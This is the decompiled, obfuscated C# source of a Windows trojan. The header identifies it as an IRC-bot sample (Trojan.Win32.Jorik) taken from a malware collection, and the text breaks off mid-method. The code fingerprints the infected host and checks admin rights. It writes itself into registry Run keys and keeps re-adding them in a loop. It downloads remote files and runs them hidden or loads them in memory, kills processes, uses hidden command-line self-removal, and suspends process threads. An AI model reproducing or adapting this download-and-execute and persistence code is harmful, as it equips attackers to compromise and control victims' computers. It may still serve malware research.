// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0001;
using \u0004;
using \u000E;
using \u000F;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace \u000F
{
  internal sealed class \u0002
  {
    private static readonly Random \u0001;
    public static bool \u0001;
    public static bool \u0002;
    public static bool \u0003;
    public static string \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u001C;

    public static string \u0001()
    {
      string[] strArray1 = new string[10];
      string[] strArray2;
      if (true)
        strArray2 = strArray1;
      strArray2[0] = \u0002.\u0002();
      strArray2[1] = \u0002.\u001C(1575);
      strArray2[2] = \u0002.\u0006();
      strArray2[3] = \u0002.\u001C(1580);
      strArray2[4] = \u0002.\u0003();
      strArray2[5] = \u0002.\u001C(1543);
      strArray2[6] = \u0002.\u0004();
      strArray2[7] = \u0002.\u0005();
      strArray2[8] = \u0002.\u001C(1585);
      strArray2[9] = \u000F.\u0001.\u0002;
      return \u0018.\u001A\u0002(strArray2);
    }

    public static string \u0002()
    {
label_0:
      string str;
      try
      {
        DateTime dateTime = \u0096.\u001C\u0003(\u000F.\u0001.\u0001);
        do
        {
          TimeSpan timeSpan = \u0097.\u001D\u0003().Subtract(dateTime);
          while (timeSpan.TotalHours <= 1.0)
          {
            str = \u0002.\u001C(1591);
            if (true)
              goto label_7;
          }
          str = \u0002.\u001C(1590);
          if (false)
            goto label_0;
        }
        while (false);
      }
      catch
      {
        str = \u0002.\u001C(1590);
      }
label_7:
      return str;
    }

    public static string \u0003()
    {
      string str = \u0002.\u001C(1590);
      OperatingSystem operatingSystem = \u0098.\u001E\u0003();
      if (\u0099.\u007E\u001F\u0003((object) operatingSystem) == PlatformID.Win32NT)
      {
        if (\u0019.\u007E\u001D\u0002((object) \u009A.\u007E\u007F\u0003((object) operatingSystem)) == 5)
        {
          switch (\u0019.\u007E\u001E\u0002((object) \u009A.\u007E\u007F\u0003((object) operatingSystem)))
          {
            case 0:
              str = \u0002.\u001C(1596);
              break;
            case 1:
              str = \u0002.\u001C(1601);
              break;
            case 2:
              str = \u0002.\u001C(1606);
              break;
          }
        }
        if (\u0019.\u007E\u001D\u0002((object) \u009A.\u007E\u007F\u0003((object) operatingSystem)) == 6)
        {
          switch (\u0019.\u007E\u001E\u0002((object) \u009A.\u007E\u007F\u0003((object) operatingSystem)))
          {
            case 0:
              str = \u0002.\u001C(1611);
              break;
            case 1:
              str = \u0002.\u001C(1616);
              break;
            case 2:
              str = \u0002.\u001C(1621);
              break;
          }
        }
      }
      if (global::\u0007.\u0088(str, \u0002.\u001C(1590)))
        str = \u0002.\u001C(1601);
      return str;
    }

    public static string \u0004() => \u0005.\u007E\u0081((object) \u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) global::\u0008.\u007E\u0089((object) Registry.LocalMachine, \u0002.\u001C(1626)), \u0002.\u001C(1691))), \u0002.\u001C(1708)) ? \u0002.\u001C(1713) : \u0002.\u001C(1718);

    public static string \u0005()
    {
      int num1;
      int num2;
      do
      {
        if (true)
        {
          num1 = \u009C.\u007E\u0081\u0003((object) new WindowsPrincipal(\u009B.\u0080\u0003()), WindowsBuiltInRole.Administrator) ? 1 : 0;
          if (true)
          {
            if (num1 == 0)
            {
              num2 = 0;
              if (num2 != 0)
                goto label_13;
              else
                goto label_14;
            }
          }
          else
            goto label_2;
        }
      }
      while (false);
      int num3 = 1;
label_7:
      bool flag;
      if (true)
        flag = num3 != 0;
      int num4 = flag ? 1 : 0;
      goto label_8;
label_14:
      num3 = num2;
      goto label_7;
label_8:
      return num4 != 0 ? \u0002.\u001C(1723) : \u0002.\u001C(1728);
label_2:
      num4 = num1;
      goto label_8;
label_13:
      num4 = num2;
      goto label_8;
    }

    public static string \u0006()
    {
      try
      {
        WebClient webClient = new WebClient();
        try
        {
          string str = \u009D.\u007E\u0082\u0003((object) webClient, \u0002.\u001C(1733));
          string[] strArray = \u009E.\u007E\u0083\u0003((object) str, new string[1]
          {
            \u0002.\u001C(1766)
          }, StringSplitOptions.None);
          \u0002.\u0001 = strArray[0];
          return \u0019.\u007E\u001C\u0002((object) strArray[1]) == 2 && global::\u0007.\u0087(strArray[1], \u0002.\u001C(1775)) ? strArray[1] : \u0002.\u0007();
        }
        finally
        {
          if (webClient != null)
            \u0013.\u007E\u009D((object) webClient);
        }
      }
      catch
      {
        return \u0002.\u0007();
      }
    }

    public static string \u0007() => \u0003.\u007E\u000F((object) \u009F.\u0084\u0003());

    public static string \u0001([In] int obj0)
    {
      char[] chArray;
      do
      {
        chArray = new char[obj0];
        int index;
        if (true)
        {
          index = 0;
          goto label_4;
        }
label_2:
        if (true)
        {
          chArray[index] = \u0002\u0002.\u007E\u0087\u0003((object) \u0002.\u001C(1780), \u0001\u0002.\u007E\u0086\u0003((object) \u0002.\u0001, \u0019.\u007E\u001C\u0002((object) \u0002.\u001C(1780))));
          if (true)
            ++index;
        }
        else
          continue;
label_4:
        if (index < obj0)
          goto label_2;
      }
      while (false);
      return new string(chArray);
    }

    public static string \u0001([In] string obj0)
    {
      try
      {
        Assembly assembly = \u0004\u0002.\u008B\u0003(\u0003\u0002.\u0089\u0003(obj0));
        return \u0005\u0002.\u008C\u0003(\u0002.\u001C(1817), \u0003.\u007E\u0010((object) assembly), \u0002.\u001C(1826), \u0015.\u007E\u0016\u0002((object) \u0003.\u007E\u0007((object) assembly), new char[1]
        {
          ','
        })[0]);
      }
      catch
      {
        return \u0002.\u001C(1835);
      }
    }

    public static string \u0002([In] string obj0)
    {
      string str1 = \u0002.\u001C(1590);
      FileStream fileStream1 = (FileStream) null;
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      try
      {
        FileStream fileStream2 = \u0002.\u0001(obj0);
        if (true)
          goto label_3;
label_2:
        byte[] numArray = \u0006\u0002.\u007E\u008D\u0003((object) cryptoServiceProvider, (Stream) fileStream1);
        \u0013.\u007E\u0004\u0002((object) fileStream1);
        string str2 = \u0007\u0002.\u007E\u008E\u0003((object) \u0082.\u0092\u0002(numArray), \u0002.\u001C(1543), \u0002.\u001C(1590));
        \u0013.\u007E\u0005\u0002((object) fileStream1);
        return \u0003.\u007E\u0008((object) str2);
label_3:
        fileStream1 = fileStream2;
        goto label_2;
      }
      catch
      {
        return \u0002.\u001C(1844);
      }
    }

    private static FileStream \u0001([In] string obj0) => new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);

    public static void \u0001([In] string obj0)
    {
      try
      {
        \u0013.\u007E\u0006\u0002((object) \u0003.\u0001);
        foreach (Process process in \u0014.\u0015\u0002(global::\u0004.\u001D(\u0003.\u0001)))
        {
          \u0002.\u0001(\u0019.\u007E\u001B\u0002((object) process));
          \u0013.\u007E\u009E((object) process);
          \u0013.\u007E\u009F((object) process);
          \u001A.\u0081\u0002(\u0003.\u0001, FileAttributes.Normal);
          \u001B.\u0082\u0002(\u0003.\u0001);
        }
      }
      catch
      {
      }
      try
      {
        \u0002.\u0002(obj0);
        \u001A.\u0081\u0002(\u000F.\u0001.\u0001, FileAttributes.Normal);
        \u0002.\u0001 = false;
        \u0012.\u007E\u008F((object) \u0002.\u0001(), \u000F.\u0001.\u0015);
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        \u0012.\u007E\u0090((object) processStartInfo, \u0010.\u008D(\u0002.\u001C(1853), \u000F.\u0001.\u0001));
        \u0008\u0002.\u007E\u008F\u0003((object) processStartInfo, ProcessWindowStyle.Hidden);
        \u0084.\u007E\u0097\u0002((object) processStartInfo, true);
        \u0012.\u007E\u0091((object) processStartInfo, \u0002.\u001C(1902));
        Process process = \u000E\u0002.\u0090\u0003(processStartInfo);
        \u001F.\u0088\u0002(0);
      }
      catch
      {
        \u001F.\u0088\u0002(0);
      }
    }

    public static RegistryKey \u0001()
    {
      if (global::\u0007.\u0088(\u0002.\u0005(), \u0002.\u001C(1728)))
        return \u000F\u0002.\u007E\u0091\u0003((object) Registry.CurrentUser, \u0002.\u001C(390), true);
      try
      {
        \u0010\u0002.\u007E\u0092\u0003((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u001C(390), true), \u000F.\u0001.\u0015, (object) \u000F.\u0001.\u0001);
        \u000F.\u0001.\u0006 = \u0002.\u001C(1915);
        return \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u001C(390), true);
      }
      catch
      {
        return \u000F\u0002.\u007E\u0091\u0003((object) Registry.CurrentUser, \u0002.\u001C(390), true);
      }
    }

    public static void \u0001()
    {
      while (true)
      {
        do
        {
          if (true)
          {
            if (\u0002.\u0001)
              goto label_1;
          }
        }
        while (false);
        break;
label_1:
        try
        {
          if (global::\u0007.\u0087(\u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) \u0002.\u0001(), \u000F.\u0001.\u0015)), \u000F.\u0001.\u0001))
          {
            if (true)
            {
              if (true)
                \u0010\u0002.\u007E\u0092\u0003((object) \u0002.\u0001(), \u000F.\u0001.\u0015, (object) \u000F.\u0001.\u0001);
            }
          }
        }
        catch
        {
          do
          {
            \u0010\u0002.\u007E\u0092\u0003((object) \u0002.\u0001(), \u000F.\u0001.\u0015, (object) \u000F.\u0001.\u0001);
          }
          while (false);
        }
        \u001F.\u0087\u0002(1000);
      }
    }

    public static string \u0001([In] string obj0, [In] string obj1, [In] string obj2, [In] bool obj3)
    {
      string str1 = \u0002.\u001C(368);
      bool flag1 = false;
      bool flag2 = false;
      if (!\u0005.\u007E\u0081((object) obj0, \u0002.\u001C(1924)) && !\u0005.\u007E\u0081((object) obj0, \u0002.\u001C(1937)))
        obj0 = \u0010.\u008D(\u0002.\u001C(1924), obj0);
      if (!\u0011\u0002.\u0093\u0003(obj1))
      {
        if (\u0005.\u007E\u0081((object) obj1, \u0002.\u001C(1543)))
        {
          if (\u0005.\u007E\u0081((object) obj1, \u0002.\u001C(1950)))
            flag1 = true;
          else if (\u0005.\u007E\u0081((object) obj1, \u0002.\u001C(1955)))
          {
            if (!\u0011\u0002.\u0093\u0003(obj2))
              flag2 = true;
          }
        }
        else
          str1 = obj1;
      }
      try
      {
        string fileName = \u0005\u0002.\u008C\u0003(global::\u0004.\u001C(str1), \u0002.\u001C(1960), \u0002.\u0001(6), \u0002.\u001C(1965));
        int num1;
        if (flag1)
        {
          if (true)
          {
            WebClient webClient = new WebClient();
            try
            {
              // ISSUE: object of a compiler-generated type is created
              // ISSUE: variable of a compiler-generated type
              \u0002.\u0001 obj = new \u0002.\u0001();
              byte[] numArray = \u0081.\u007E\u0090\u0002((object) webClient, obj0);
              // ISSUE: reference to a compiler-generated field
              obj.\u0001 = \u0004\u0002.\u008B\u0003(numArray);
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              string[] strArray = new string[7]
              {
                \u0002.\u001C(1974),
                \u0002.\u0001(\u0010.\u008D(\u0002.\u001C(579), \u0003.\u007E\u0007((object) obj.\u0001))),
                \u0002.\u001C(2023),
                \u0002.\u0001(\u0010.\u008D(\u0002.\u001C(579), \u0003.\u007E\u0010((object) obj.\u0001))),
                \u0002.\u001C(2040),
                \u0002.\u0001(\u0089.\u0002\u0003((object) \u0002.\u001C(579), (object) numArray.Length)),
                \u0002.\u001C(493)
              };
              \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0002.\u0005);
              // ISSUE: reference to a compiler-generated method
              \u0013.\u0002\u0002((object) new Thread(new ThreadStart(obj.\u0001)));
              goto label_39;
            }
            finally
            {
              if (webClient != null)
                \u0013.\u007E\u009D((object) webClient);
            }
          }
        }
        else
        {
          WebClient webClient = new WebClient();
          try
          {
            \u0012\u0002.\u007E\u0095\u0003((object) webClient, obj0, fileName);
          }
          finally
          {
            if (webClient != null)
              \u0013.\u007E\u009D((object) webClient);
          }
          if (\u0011\u0002.\u0094\u0003(fileName))
          {
            if (flag2)
            {
              num1 = \u0016.\u0017\u0002(obj2);
            }
            else
            {
              Process process = new Process();
              try
              {
                FileInfo fileInfo = new FileInfo(fileName);
                \u0012.\u007E\u0091((object) \u0013\u0002.\u007E\u0096\u0003((object) process), fileName);
                if (obj3)
                {
                  \u0008\u0002.\u007E\u008F\u0003((object) \u0013\u0002.\u007E\u0096\u0003((object) process), ProcessWindowStyle.Hidden);
                  \u0084.\u007E\u0097\u0002((object) \u0013\u0002.\u007E\u0096\u0003((object) process), true);
                }
                int num2 = \u008C.\u007E\u0007\u0003((object) process) ? 1 : 0;
                string[] strArray = new string[7]
                {
                  \u0002.\u001C(2232),
                  \u0002.\u0001(fileName),
                  \u0002.\u001C(2249),
                  \u0002.\u0001(\u0002.\u0001(fileName)),
                  \u0002.\u001C(2104),
                  \u0002.\u0001(\u0083.\u0093\u0002((object) \u0002.\u001C(579), (object) \u0014\u0002.\u007E\u0097\u0003((object) fileInfo), (object) \u0002.\u001C(2117))),
                  \u0002.\u001C(493)
                };
                \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0002.\u0005);
                goto label_39;
              }
              finally
              {
                if (process != null)
                  \u0013.\u007E\u009D((object) process);
              }
            }
          }
          else
            goto label_39;
        }
        Process process1 = new Process();
        try
        {
          FileInfo fileInfo = new FileInfo(fileName);
          \u0012.\u007E\u0091((object) \u0013\u0002.\u007E\u0096\u0003((object) process1), fileName);
          if (obj3)
          {
            \u0008\u0002.\u007E\u008F\u0003((object) \u0013\u0002.\u007E\u0096\u0003((object) process1), ProcessWindowStyle.Hidden);
            \u0084.\u007E\u0097\u0002((object) \u0013\u0002.\u007E\u0096\u0003((object) process1), true);
          }
          int num3 = \u008C.\u007E\u0007\u0003((object) process1) ? 1 : 0;
          string[] strArray = new string[9]
          {
            \u0002.\u001C(2053),
            \u0002.\u0001(fileName),
            \u0002.\u001C(2070),
            \u0002.\u0001(\u0089.\u0002\u0003((object) \u0002.\u001C(579), (object) num1)),
            \u0002.\u001C(2079),
            \u0002.\u0001(\u0002.\u0001(fileName)),
            \u0002.\u001C(2104),
            \u0002.\u0001(\u0083.\u0093\u0002((object) \u0002.\u001C(579), (object) \u0014\u0002.\u007E\u0097\u0003((object) fileInfo), (object) \u0002.\u001C(2117))),
            \u0002.\u001C(493)
          };
          \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0002.\u0005);
          \u001F.\u0087\u0002(num1 * 1000);
          \u0002.\u0001(\u0011.\u008E(\u0002.\u001C(2126), \u0002.\u0001(fileName), \u0002.\u001C(2167)), \u000F.\u0001.\u0010);
          \u0013.\u007E\u009E((object) process1);
          \u001B.\u0082\u0002(fileName);
        }
        finally
        {
          if (process1 != null)
            \u0013.\u007E\u009D((object) process1);
        }
label_39:
        return fileName;
      }
      catch (Exception ex)
      {
        string str2 = \u0002.\u001C(2262);
        string str3 = !\u0005.\u007E\u0081((object) \u0003.\u007E\u0011((object) ex), \u0002.\u001C(2303)) ? (!\u0005.\u007E\u0081((object) \u0003.\u007E\u0011((object) ex), \u0002.\u001C(2337)) ? (string) null : \u0010.\u008D(str2, \u0002.\u0001(\u0002.\u001C(2342)))) : \u0010.\u008D(str2, \u0002.\u0001(\u0002.\u001C(2308)));
        if (str3 != null)
          \u0002.\u0001(\u0010.\u008D(str3, \u0002.\u001C(493)), \u0002.\u0005);
        return \u0002.\u001C(1844);
      }
    }

    public static void \u0001([In] string obj0, [In] string obj1)
    {
      try
      {
        string str1 = \u0005\u0002.\u008C\u0003(global::\u0004.\u001C(\u0002.\u001C(368)), \u0002.\u001C(1960), \u0002.\u0001(5), \u0002.\u001C(1965));
        WebClient webClient = new WebClient();
        try
        {
          \u0012\u0002.\u007E\u0095\u0003((object) webClient, obj0, str1);
          string str2 = \u0002.\u0002(str1);
          if (global::\u0007.\u0088(obj1, str2))
          {
            if (global::\u0007.\u0088(\u000F.\u0001.\u0004, str2))
            {
              \u0002.\u0001(\u0011.\u008E(\u0002.\u001C(2375), \u0002.\u0001(\u0005\u0002.\u008C\u0003(\u0002.\u001C(579), \u000F.\u0001.\u0004, \u0002.\u001C(2420), str2)), \u0002.\u001C(493)), \u000F.\u0001.\u0010);
            }
            else
            {
              Process process = new Process();
              try
              {
                \u0012.\u007E\u0091((object) \u0013\u0002.\u007E\u0096\u0003((object) process), str1);
                int num = \u008C.\u007E\u0007\u0003((object) process) ? 1 : 0;
              }
              finally
              {
                if (process != null)
                  \u0013.\u007E\u009D((object) process);
              }
              \u0002.\u0001(\u0011.\u008E(\u0002.\u001C(2429), \u0002.\u0001(\u0005\u0002.\u008C\u0003(\u0002.\u001C(579), \u000F.\u0001.\u0004, \u0002.\u001C(1826), str2)), \u0002.\u001C(493)), \u000F.\u0001.\u0010);
              \u0002.\u0001(\u0002.\u001C(2470));
            }
          }
          else
          {
            string[] strArray;
            do
            {
              strArray = new string[5]
              {
                \u0002.\u001C(2487),
                \u0002.\u0001(\u0010.\u008D(\u0002.\u001C(579), obj1)),
                null,
                null,
                null
              };
            }
            while (false);
            strArray[2] = \u0002.\u001C(2508);
            strArray[3] = \u0002.\u0001(\u0010.\u008D(\u0002.\u001C(579), str2));
            strArray[4] = \u0002.\u001C(493);
            \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u000F.\u0001.\u0010);
          }
        }
        finally
        {
          if (webClient != null)
            \u0013.\u007E\u009D((object) webClient);
        }
      }
      catch
      {
      }
    }

    public static List<string> \u0001()
    {
      List<string> stringList = new List<string>();
      int ipVersion = 2;
      int index;
      byte[] pTcpTable;
      if (true)
      {
        int dwOutBufLen;
        if (true)
          dwOutBufLen = 20000;
        pTcpTable = new byte[dwOutBufLen];
        \u0007.\u0001.\u0001(pTcpTable, out dwOutBufLen, true, ipVersion, \u0007.\u0001.\u0001.\u0006, 0);
        index = 0;
      }
      int int32 = Convert.ToInt32(pTcpTable[index]);
      if (true)
        index += 4;
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        int num3;
        while (true)
        {
          int num4 = num2;
          int num5;
          while (true)
          {
            num5 = int32;
            int num6;
            do
            {
              if (false)
                goto label_16;
              else
                goto label_22;
label_8:
              num6 = num4 + num5;
              if (true)
              {
                index = num6;
                \u0002.\u0001(pTcpTable, ref index, false).Address.ToString();
                IPEndPoint ipEndPoint = \u0002.\u0001(pTcpTable, ref index, true);
                int num7 = \u0002.\u0001(pTcpTable, ref index);
                try
                {
                  string str = ipEndPoint.Address.ToString() + \u0002.\u001C(529) + ipEndPoint.Port.ToString();
                  if (!str.Split(':')[0].Contains(\u0002.\u001C(2513)))
                  {
                    if (!str.Split(':')[0].Contains(\u0002.\u001C(2526)))
                      stringList.Add(str + \u0002.\u001C(529) + num7.ToString());
                  }
                }
                catch
                {
                }
                int num8 = num2;
                num5 = 1;
                num4 = num8;
              }
              else
                goto label_13;
label_16:
              if (num5 != 0)
                continue;
              goto label_8;
label_22:
              if (num4 < num5)
              {
                num3 = (int) pTcpTable[index];
                if (true)
                {
                  Convert.ToInt32((byte) num3);
                  int num9 = index;
                  num5 = 4;
                  num4 = num9;
                  goto label_8;
                }
                else
                  goto label_26;
              }
              else
                goto label_23;
            }
            while (num5 == 0);
            break;
label_13:
            num4 = num6;
          }
          num2 = num4 + num5;
        }
label_26:
        num1 = num3;
      }
label_23:
      return stringList;
    }

    private static int \u0001([In] byte[] obj0, [In] ref int obj1)
    {
      if (true)
        goto label_11;
label_10:
      int num1;
      return num1;
label_11:
      int num2 = (int) obj0[obj1];
      int num3 = (int) obj0[obj1 + 1];
      int num4 = 8;
      int num5;
      if (num4 != 0)
      {
        int num6 = num3 << num4;
        int num7 = num2 + num6;
        int num8 = (int) obj0[obj1 + 2];
        int num9 = 16;
        if (num9 != 0)
        {
          if (num9 != 0)
          {
            int num10 = num8 << num9;
            int num11 = num7 + num10;
            if (false)
            {
              num5 = num11;
              goto label_8;
            }
            else
            {
              int num12 = (int) obj0[obj1 + 3];
              num4 = 24;
              num3 = num12;
              num2 = num11;
            }
          }
          else
          {
            num4 = num9;
            num3 = num8;
            num2 = num7;
          }
        }
        else
        {
          num4 = num9;
          num3 = num8;
          num2 = num7;
        }
      }
      int num13 = num3 << num4;
      num5 = num2 + num13;
label_8:
      if (true)
        goto label_13;
label_9:
      obj1 += 4;
      goto label_10;
label_13:
      num1 = num5;
      goto label_9;
    }

    private static IPEndPoint \u0001([In] byte[] obj0, [In] ref int obj1, [In] bool obj2)
    {
      int num1 = (int) obj0[obj1 + 3] << 24;
      int port;
      long address;
      int num2;
      int num3;
      int num4;
      while (true)
      {
        int num5 = (int) obj0[obj1 + 2] << 16;
        num2 = num1 | num5;
        if (true)
        {
          int num6 = (int) obj0[obj1 + 1] << 8;
          int num7 = num2 | num6;
          if (true)
            goto label_15;
label_4:
          if (num7 == 0 || address != 0L)
          {
            num3 = (int) obj0[obj1];
            if (false)
            {
              num1 = num3;
              continue;
            }
            break;
          }
          goto label_7;
label_15:
          int num8 = (int) obj0[obj1];
          address = (long) (num7 | num8) & (long) uint.MaxValue;
          obj1 += 4;
          num4 = 0;
          if (num4 == 0)
          {
            port = num4;
            num7 = obj2 ? 1 : 0;
            goto label_4;
          }
          else
            goto label_1;
        }
        else
          goto label_9;
      }
      num2 = (num3 << 8) + (int) obj0[obj1 + 1] + ((int) obj0[obj1 + 2] << 24) + ((int) obj0[obj1 + 3] << 16);
      goto label_9;
label_7:
      if (true)
        num2 = 0;
      else
        goto label_10;
label_9:
      port = num2;
      goto label_10;
label_1:
      num2 = num4;
      goto label_9;
label_10:
      IPEndPoint ipEndPoint;
      if (true)
      {
        obj1 += 4;
        ipEndPoint = new IPEndPoint(address, port);
      }
      return ipEndPoint;
    }

    public static void \u0001([In] int obj0)
    {
      Process process = \u0017.\u0019\u0002(obj0);
      try
      {
        if (global::\u0007.\u0088(\u0003.\u007E\u0004((object) process), string.Empty))
          return;
        IEnumerator enumerator = \u0016\u0002.\u007E\u009B\u0003((object) \u0015\u0002.\u007E\u009A\u0003((object) process));
        try
        {
          while (\u008C.\u007E\u0008\u0003((object) enumerator))
          {
            ProcessThread processThread = (ProcessThread) \u0017\u0002.\u007E\u009C\u0003((object) enumerator);
            IntPtr num1 = \u0007.\u0001.\u0001(\u0007.\u0001.\u0002.\u0002, false, (uint) \u0019.\u007E\u001F\u0002((object) processThread));
            if (\u0018\u0002.\u009D\u0003(num1, IntPtr.Zero))
              break;
            if (true)
            {
              int num2 = (int) \u0007.\u0001.\u0001(num1);
            }
          }
        }
        finally
        {
          do
          {
            if (enumerator is IDisposable disposable)
              \u0013.\u007E\u009D((object) disposable);
          }
          while (false);
        }
      }
      finally
      {
        if (process != null)
          \u0013.\u007E\u009D((object) process);
      }
    }

    public static void \u0002([In] string obj0)
    {
      try
      {
        string str1;
        string str2;
        if (true)
        {
          str1 = \u0002.\u001C(1590);
          str2 = \u0002.\u001C(1590);
        }
        else
          goto label_15;
label_2:
        string str3 = \u0002.\u001C(1590);
        string str4 = \u0002.\u001C(1590);
        if (true)
          goto label_20;
label_3:
        string str5 = \u0019\u0002.\u007E\u009E\u0003((object) \u0080.\u008A\u0002(), \u0003\u0002.\u008A\u0003(obj0));
        string[] strArray1 = \u0015.\u007E\u0016\u0002((object) str5, new char[1]
        {
          '|'
        });
        string str6 = \u0019\u0002.\u007E\u009E\u0003((object) \u0080.\u008A\u0002(), \u0003\u0002.\u008A\u0003(strArray1[0]));
        string str7 = strArray1[1];
        string[] strArray2;
        int index;
        if (global::\u0007.\u0088(str7, \u000F.\u0001.\u000F))
        {
          int num = \u0016.\u0017\u0002(\u001D.\u007E\u0084\u0002((object) str7, 5, 3));
          string str8 = \u0007\u0002.\u007E\u008E\u0003((object) \u0002.\u0001(str6, num), \u0002.\u001C(2539), \u0002.\u001C(493));
          string[] strArray3 = \u0015.\u007E\u0016\u0002((object) str8, new char[1]
          {
            '|'
          });
          if (true)
          {
            strArray2 = strArray3;
            index = 0;
            goto label_16;
          }
          else
            goto label_14;
        }
        else
          goto label_19;
label_20:
        string str9 = str4;
        goto label_3;
label_14:
        string[] strArray4;
        \u0002.\u0001(strArray4[0], \u0002.\u0005, str1, str2, str3, str9, strArray4);
label_15:
        ++index;
label_16:
        int num1 = index;
        int num2 = strArray2.Length;
        if (true)
          num2 = num2;
        if (num1 < num2)
        {
          string str10 = strArray2[index];
          if (true)
          {
            strArray4 = \u0015.\u007E\u0016\u0002((object) str10, new char[1]
            {
              ' '
            });
            try
            {
              str1 = strArray4[1];
              if (true)
                str2 = strArray4[2];
              else
                goto label_11;
label_10:
              str3 = strArray4[3];
label_11:
              str9 = strArray4[4];
              if (false)
                goto label_10;
              else
                goto label_14;
            }
            catch
            {
              goto label_14;
            }
          }
          else
            goto label_2;
        }
label_19:
        if (false)
          goto label_16;
      }
      catch
      {
      }
    }

    public static string \u0001([In] string obj0, [In] int obj1)
    {
      StringBuilder stringBuilder1 = new StringBuilder(obj0);
      int num1;
      StringBuilder stringBuilder2;
      int num2;
      if (true)
      {
        stringBuilder2 = new StringBuilder(\u0019.\u007E\u001C\u0002((object) obj0));
        int num3 = 0;
        if (num3 != 0)
        {
          num2 = num3;
        }
        else
        {
          num1 = num3;
          goto label_9;
        }
      }
      else
        goto label_9;
label_5:
      int num4 = (int) (char) num2;
      int num5;
      int num6;
      if (true)
      {
        int num7 = obj1;
        num5 = (int) (ushort) (num4 ^ num7);
      }
      else
      {
        num6 = num4;
        goto label_8;
      }
label_7:
      char ch = (char) num5;
      StringBuilder stringBuilder3 = \u001A\u0002.\u007E\u009F\u0003((object) stringBuilder2, ch);
      num6 = num1 + 1;
label_8:
      num1 = num6;
label_9:
      num5 = num1;
      if (true)
      {
        int num8 = \u0019.\u007E\u001C\u0002((object) obj0);
        if (num5 >= num8)
          return \u0003.\u007E\u0005((object) stringBuilder2);
        num2 = (int) \u0002\u0002.\u007E\u0088\u0003((object) stringBuilder1, num1);
        goto label_5;
      }
      else
        goto label_7;
    }

    public static void \u0002()
    {
      Process process = new Process();
      try
      {
        \u0012.\u007E\u0091((object) \u0013\u0002.\u007E\u0096\u0003((object) process), \u0089.\u0002\u0003((object) Environment.SpecialFolder.System, (object) \u0002.\u001C(2544)));
        \u0012 obj = \u0012.\u007E\u0090;
        ProcessStartInfo processStartInfo = \u0013\u0002.\u007E\u0096\u0003((object) process);
        string[] strArray = new string[5]
        {
          \u0002.\u001C(2557),
          \u000F.\u0001.\u0001,
          \u0002.\u001C(2614),
          \u000F.\u0001.\u0001,
          \u0002.\u001C(2659)
        };
        string str = \u0018.\u001A\u0002(strArray);
        obj((object) processStartInfo, str);
        \u0008\u0002.\u007E\u008F\u0003((object) \u0013\u0002.\u007E\u0096\u0003((object) process), ProcessWindowStyle.Hidden);
        \u0084.\u007E\u0097\u0002((object) \u0013\u0002.\u007E\u0096\u0003((object) process), true);
        int num = \u008C.\u007E\u0007\u0003((object) process) ? 1 : 0;
      }
      finally
      {
        if (process != null)
          \u0013.\u007E\u009D((object) process);
      }
    }

    public static string \u0008()
    {
      string str;
      if (true)
        str = \u0002.\u001C(789);
      do
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0011.\u008E(\u0002.\u001C(2676), \u001B\u0002.\u0001\u0004(), \u0002.\u001C(2681)), \u0002.\u001C(2710));
        try
        {
          ManagementObjectCollection objectCollection;
          if (true)
            objectCollection = \u001C\u0002.\u007E\u0004\u0004((object) managementObjectSearcher);
          if (true)
          {
            ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = \u001D\u0002.\u007E\u0005\u0004((object) objectCollection);
            try
            {
              while (true)
              {
                if (true)
                  goto label_11;
label_9:
                ManagementObject managementObject;
                str = \u0003.\u007E\u0005(global::\u000F.\u007E\u008C((object) managementObject, \u0002.\u001C(2751)));
                continue;
label_11:
                if (true)
                {
                  if (\u008C.\u007E\u000E\u0003((object) objectEnumerator))
                  {
                    managementObject = (ManagementObject) \u001E\u0002.\u007E\u0006\u0004((object) objectEnumerator);
                    goto label_9;
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            finally
            {
              if (objectEnumerator != null)
                \u0013.\u007E\u009D((object) objectEnumerator);
            }
          }
        }
        finally
        {
          if (managementObjectSearcher != null)
            \u0013.\u007E\u009D((object) managementObjectSearcher);
        }
      }
      while (false);
      return str;
    }

    public static string \u000E()
    {
      string str;
      if (true)
        str = \u0002.\u001C(789);
      do
      {
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0011.\u008E(\u0002.\u001C(2676), \u001B\u0002.\u0001\u0004(), \u0002.\u001C(2681)), \u0002.\u001C(2768));
        try
        {
          ManagementObjectCollection objectCollection;
          if (true)
            objectCollection = \u001C\u0002.\u007E\u0004\u0004((object) managementObjectSearcher);
          if (true)
          {
            ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = \u001D\u0002.\u007E\u0005\u0004((object) objectCollection);
            try
            {
              while (true)
              {
                if (true)
                  goto label_11;
label_9:
                ManagementObject managementObject;
                str = \u0003.\u007E\u0005(global::\u000F.\u007E\u008C((object) managementObject, \u0002.\u001C(2751)));
                continue;
label_11:
                if (true)
                {
                  if (\u008C.\u007E\u000E\u0003((object) objectEnumerator))
                  {
